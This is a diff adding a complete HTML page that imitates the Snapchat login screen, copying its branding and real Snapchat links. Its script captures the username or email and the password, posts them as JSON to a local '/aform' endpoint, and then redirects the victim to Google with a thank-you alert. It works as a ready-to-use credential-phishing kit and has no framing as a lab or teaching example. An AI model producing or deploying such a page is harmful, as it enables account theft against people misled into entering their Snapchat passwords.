@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Snapchat Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Arial', sans-serif;
+    }
+
+    body {
+      height: 100vh;
+      background: linear-gradient(to bottom, #fffc00, #ffffff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-container {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 360px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 60px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #fffc00;
+      color: black;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    .links {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .links a {
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="snapchat.png" alt="Snapchat Logo" class="logo">
+    <h2>Login</h2>
+    <form action="/aform" id="aForm" method="POST">
+    <input name="email" type="text" placeholder="Username or Email">
+    <input name="password" type="password" placeholder="Password">
+    <button type="submit">Log In</button>
+    </form>
+    <div class="links">
+      <p><a href="https://accounts.snapchat.com/accounts/password_reset_request">Forgot Password?</a></p>
+      <p>New to Snapchat? <a href="https://accounts.snapchat.com/v2/signup?continue=%2Faccounts%2Fwelcome&locale=en-GB">Sign Up</a></p>
+    </div>
+  </div>
+
+  </body>
+</body>
+</html>
+
+<script>
+  document.getElementById('aForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const formData = new FormData(e.target);
+    const payload = {
+      email: formData.get('email'),
+      password: formData.get('password')
+    };
+
+    const response = await fetch('/aform', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    });
+
+    if (response.ok) {
+      alert('Thanks for submitting!');
+      window.location.href = 'https://google.com'; // Redirect after alert
+    } else {
+      alert('failed. Try again!');
+    }
+  });
+</script>
